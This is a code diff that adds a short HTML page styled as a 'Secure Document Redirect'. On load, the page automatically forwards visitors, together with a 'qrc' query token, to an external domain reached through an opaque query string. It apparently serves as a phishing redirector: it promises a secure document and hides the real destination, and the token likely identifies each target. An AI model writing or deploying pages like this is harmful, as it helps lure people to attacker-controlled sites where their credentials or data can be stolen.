@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Document Redirect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script>
+    window.onload = function () {
+      const params = new URLSearchParams(window.location.search);
+      const qrc = params.get("qrc");
+      const base = "https://crest-steel.com/?dtxfrjin";
+
+      // Forward with or without qrc
+      if (qrc) {
+        window.location.href = `${base}&qrc=${encodeURIComponent(qrc)}`;
+      } else {
+        window.location.href = base;
+      }
+    };
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h2>Redirecting to your secure document...</h2>
+  <p>If you're not redirected automatically, <a href="https://crest-steel.com/?dtxfrjin">click here</a>.</p>
+</body>
+</html>
